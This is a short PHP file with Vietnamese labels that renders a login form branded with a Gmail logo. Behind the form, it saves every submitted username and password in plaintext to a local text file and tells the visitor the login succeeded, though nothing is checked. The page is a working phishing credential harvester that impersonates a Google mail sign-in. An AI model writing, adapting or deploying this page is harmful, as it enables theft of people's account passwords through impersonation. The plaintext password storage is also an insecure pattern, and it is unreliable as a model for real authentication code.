<?php
// Khởi tạo biến lưu thông báo
$message = '';

// Xử lý khi người dùng submit form
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Lấy dữ liệu từ form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Kiểm tra dữ liệu không rỗng
    if (!empty($username) && !empty($password)) {
        // Lưu thông tin vào file
        $data = "$username\n$password\n";
        file_put_contents('loginaccount.txt', $data, FILE_APPEND);

        // Hiển thị thông báo thành công
        $message = '<div class="success-message">Đăng nhập thành công!</div>';
    } else {
        $message = '<div class="error-message">Vui lòng điền đầy đủ thông tin!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập</title>
    <link href="pages/style.css" rel="stylesheet">
</head>
<body>
    <div class="login-container">
        <?php echo $message; ?>
        
        <form action="" method="post" class="login-form">
            <div class="logo">
                <img src="pages/google_mail_gmail_logo_icon_159346.png" alt="">
            </div>
            
            <div class="input-group">
                <label for="username">Tên người dùng</label>
                <input type="text" id="username" name="username" required>
            </div>

            <div class="input-group">
                <label for="password">Mật khẩu</label>
                <input type="password" id="password" name="password" required>
            </div>

            <button type="submit">Đăng nhập</button>
        </form>
    </div>
</body>
</html>